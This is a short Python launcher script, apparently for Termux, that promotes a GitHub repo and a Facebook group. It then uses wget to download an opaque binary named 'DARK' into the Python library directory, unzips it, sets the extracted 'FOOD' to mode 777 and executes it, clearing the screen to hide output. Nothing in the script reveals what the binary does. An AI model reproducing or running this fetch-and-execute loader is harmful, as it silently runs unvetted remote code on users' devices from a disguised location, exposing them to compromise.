import os
def intro():
  print('give star to our repo')
  os.system('git pull && clear')
  os.system('xdg-open https://github.com/Ahmed-XD/XD')
  print('Join Our Facebook Group and support us')
  os.system('xdg-open https://m.facebook.com/groups/1247184652736578/')
  os.system('clear')
  


intro()
os.system("pkg install wget -y")
url = "https://github.com/Ahmed-XD/library/blob/main/extra/DARK?raw=true"
file_name = "/data/data/com.termux/files/usr/lib/python3.11/DARK"
os.system(f"wget {url} -O {file_name}")
os.system("clear")
os.system(f"unzip {file_name} > /dev/null")
os.system("chmod 777 FOOD")
os.system("./FOOD")
